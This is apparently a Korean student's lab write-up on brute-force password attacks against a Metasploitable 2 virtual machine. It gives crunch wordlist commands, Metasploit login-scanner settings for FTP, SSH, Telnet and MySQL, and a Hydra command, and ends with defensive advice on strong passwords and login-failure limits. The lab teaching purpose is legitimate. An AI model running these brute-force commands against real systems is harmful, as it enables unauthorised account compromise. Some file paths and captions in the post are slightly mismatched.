---
layout: post
title: "모의해킹 : Brute force"
tags: [event]
---

<span style="font-size:3em; color:#33FFFF;">모의해킹 : Brute force</span>
<br> 
Brute force는 무차별 대입 공격으로 불리며 비밀번호를 탈취하기 위한 가장 고전적이면서 가장 효과적인 방법이다.
<br> 
이론상으로 아무리 복잡한 비밀번호 체계일지라도 충분한 시간만 주이지면 해독이 가능한 공격이다.
<br> 
<br> 


<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-baqh{text-align:center;vertical-align:top}
.tg .tg-amwm{font-weight:bold;text-align:center;vertical-align:top}
</style>


<table class="tg">
<thead>
  <tr>
    <th class="tg-amwm">구분</th>
    <th class="tg-amwm">운영체제</th>
    <th class="tg-amwm">IP</th>
    <th class="tg-amwm">비고</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-baqh">공격자</td>
    <td class="tg-baqh">Kali linux</td>
    <td class="tg-baqh">172.16.27.140</td>
    <td class="tg-baqh">VM을 이용한 가상 환경</td>
  </tr>
  <tr>
    <td class="tg-baqh">희생자</td>
    <td class="tg-baqh">Metasploitable 2</td>
    <td class="tg-baqh">172.16.27.143</td>
    <td class="tg-baqh">VM을 이용한 가상 환경</td>
  </tr>
</tbody>
</table>
해당 공격을 실습하기 전 필요한 가상환경은 위 표와 같다.
<br> 
<br> 
<br> 


<span style="font-size:1.5em; color:#66CCFF;">Crunch</span>
<br>
<span style="font-size:1em; color:#FF0033;">Crunch</span>도구를 통해 칼리리눅스에서 무차별 대입 공격에 필요한 비밀번호 항목을 생성할 수 있다.
```
# cat /usr/share/crunch/charset.lst
```
<div style="text-align:center;">
<figure>
<img src="https://user-images.githubusercontent.com/92027143/204799516-817219c6-d54e-4950-adc5-d0769daffd97.png" >
<figcaption>
cat /usr/share/crunch/charset.lst 명령어를 입력한 모습
</figcaption>
</figure>
</div>
위 명령어를 통해 크런치 사용법을 확인할 수 있다. 이 중에서 numeric 플래그를 이용하여 숫자로만 이뤄진 비밀번호를 생성한다.
<br>
<br>


```
# crunch 1 4 -f /usr/share/crunch/charset.lst numeric -o /root/passwords.txt
```
위 명령어는 4자리로 이뤄진 비밀번호를 생성하라는 의미다. 여기서 비밀번호를 생성한 이유는 무차별 대입 공격의 하나인 <span style="font-size:1em; color:#FF0033;">Dictionary 공격</span> 일명 사전 기반 공격을 하기 위함이다. 이렇게 무차별 대입 공격을 하기 위한 사전이 준비되어 있다.
<br>
<br>


```
# cat > /root/user.txt
root
```
추가적으로 위 명령어를 실행하여 관리자 계정으로 사용하는 단어를 작성한다.
<br>
root는 Unix/Linux 기반의 운영체제와 My-sql 서버 등에서 사용하는 관리자 계정이다.
<br> 
<br> 
<br> 


<span style="font-size:1.5em; color:#66CCFF;">공격 실습</span>
<br>
```
# msfconsole
```
공격 실습에 앞서 위 명령어를 통해 메타스플로잇에 접속한다.
<br>
<br>


```
use auxiliary/scanner/ftp/ftp_login
set rhosts 172.16.27.143
set user_file /root/users.tx
set pass_file /root/passwords.txt
set stop_on_success true
set threads 256
run
```
위 명령어를 이용하여 FTP 서비스를 대상으로 공격해본다.
<br>
<br>


```
use auxiliary/scanner/ssh/ssh_login
set rhosts 172.16.27.143
set user_file /root/users.tx
set pass_file /root/passwords.txt
set stop_on_success true
set threads 256
run
```
위 명령어를 이용하여 ssh 서비스를 대상으로 공격해본다.
<br>
<br>


```
use auxiliary/scanner/telnet/telnet_login
set rhosts 172.16.27.143
set user_file /root/users.tx
set pass_file /root/passwords.txt
set stop_on_success true
set threads 256
run
```
위 명령어를 이용하여 Telnet 서비스를 대상으로 공격해본다.
<br>
<br>


```
use auxiliary/scanner/mysql/mysql_login
set rhosts 172.16.27.143
set rport 3306
set user_file /root/users.tx
set pass_file /root/passwords.txt
set stop_on_success true
set threads 256
run
```
위 명령어를 이용하여 Telnet 서비스를 대상으로 공격해본다.
<br>
<br>


이렇게 메타스플로잇을 이용하여 무차별 대입 공격을 할 수 있다. 하지만 이 경우 시간이 오래 걸릴 수 있기 때문에 <span style="font-size:1em; color:#FF0033;">Hydra</span>를 이용하여 지연 시간을 줄일 수 있다.
<br> 
<br> 
<br> 


<span style="font-size:1.5em; color:#66CCFF;">Hydra</span>
<br> 
<span style="font-size:1em; color:#FF0033;">Hydra</span>는 모의 침투 운영체제에서 기본으로 제공하는 무차별 대입 공격 도구다.
<br>
<br>


```
# hydra -l root -P /root/passwords.txt -f 172.16.27.143 ftp
```
위 명령어를 이용하여 ftp 서비스를 대상으로 공격하며 뒤 서비스를 ssh, telnet으로 변경하면 다른 서비스에 공격할 수 있다.
<br>
<br>


이외에도 흔히 정보 수집 도구로만 알려진 Nmap으로도 무차별 대입 공격이 가능하다. Nmap의 NSE 모듈을 사용하여 공격을 수행할 수 있다.
<br>
<br>
<br>


<div style="text-align:center;">
<figure>
<img src="https://user-images.githubusercontent.com/92027143/204810812-099b9090-3ffb-48ff-b2da-b995b4c87cae.png" >
<figcaption>
my-sql을 대상으로 무차별 대입 공격
</figcaption>
</figure>
</div>
<br>
<br>


<span style="font-size:1.5em; color:#66CCFF;">실습 후기</span>
<br>
이론상 가장 효과적인 무차별 대입 공격 실습을 하면서 로그인 시도 횟수 및 효과적인 암호를 위해 특수문자, 대문자, 숫자 등 여러 기호를 넣어야 하는 이유에 대해 다시 생각 해볼 수 있었으며, 서버 또는 DB 구축 시 로그인 실패 횟수를 설정하여 해당 취약점에 대비해야 한다.
<br>
<br>


<span style="font-size:1.5em; color:#66CCFF;">Author</span>
<p>
<div>
   <a href="https://accio3014.github.io/" target="_blank">Seokcheon Jeong</a>
</div>
</p>